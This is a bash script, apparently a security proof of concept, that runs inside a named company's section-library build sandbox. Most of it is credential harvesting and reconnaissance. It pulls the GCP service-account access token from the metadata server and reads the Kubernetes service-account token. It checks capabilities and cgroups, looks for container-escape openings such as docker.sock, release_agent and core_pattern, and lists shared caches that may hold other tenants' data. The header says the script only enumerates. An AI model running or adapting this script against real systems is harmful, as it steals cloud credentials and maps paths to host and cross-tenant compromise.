#!/usr/bin/env bash
# Escape-surface + credential enumeration inside the Yext section-library build sandbox.
# READ-ONLY. Enumerates only. Does NOT attempt an escape, does not write to cgroup/
# core_pattern/docker.sock, does not touch other tenants' data.
set +e
B="YEXTPOC7731"
echo "$B-BEGIN"

echo "$B === A. WHO/WHERE ==="
id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -3

echo "$B === B. GCP METADATA SERVER (highest value) ==="
MD=http://169.254.169.254/computeMetadata/v1
H='Metadata-Flavor: Google'
for P in "" "/project/project-id" "/instance/zone" "/instance/name" \
         "/instance/service-accounts/" "/instance/service-accounts/default/email" \
         "/instance/service-accounts/default/scopes"; do
  printf 'md%-48s ' "$P"
  curl -s -m 6 -H "$H" "$MD$P" 2>&1 | head -c 300; echo
done
echo "--- access token ---"
curl -s -m 8 -H "$H" "$MD/instance/service-accounts/default/token" 2>&1 | head -c 600; echo

echo "$B === C. KUBERNETES SERVICE ACCOUNT ==="
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -c 400
env | grep -i kubernetes 2>&1

echo "$B === D. CAPABILITIES / PRIVILEGE ==="
grep -E 'CapEff|CapPrm|CapBnd|NoNewPrivs|Seccomp' /proc/self/status 2>&1
capsh --print 2>&1 | head -6
cat /proc/1/cgroup 2>&1 | head -5
cat /proc/self/cgroup 2>&1 | head -5

echo "$B === E. ESCAPE SURFACE (enumerate only, nothing written) ==="
for F in /var/run/docker.sock /run/docker.sock /var/run/containerd/containerd.sock \
         /run/buildkit/buildkitd.sock /sys/fs/cgroup/release_agent \
         /proc/sys/kernel/core_pattern /dev/kmsg /dev/mem; do
  printf '%-46s ' "$F"
  if [ -e "$F" ]; then
    printf 'EXISTS '; [ -r "$F" ] && printf 'readable '; [ -w "$F" ] && printf 'WRITABLE '
    echo
  else echo "absent"; fi
done
echo "--- non-overlay mounts (host passthrough?) ---"
mount 2>&1 | grep -vE 'overlay|proc|sysfs|tmpfs|devpts|mqueue|cgroup' | head -20
echo "--- block devices ---"
ls -la /dev/ 2>&1 | grep -E 'sd|nvme|vd|dm-' | head

echo "$B === F. SHARED BUILD CACHE / OTHER TENANTS ==="
for D in /var/lib/buildkit /var/lib/docker /opt/buildhome/.npm /tmp /home; do
  printf '%-28s ' "$D"; ls -la "$D" 2>&1 | head -4 | tr '\n' ' '; echo
done
echo "--- anything readable naming another account? ---"
ls -la /opt/buildhome/ 2>&1

echo "$B-END"
exit 0
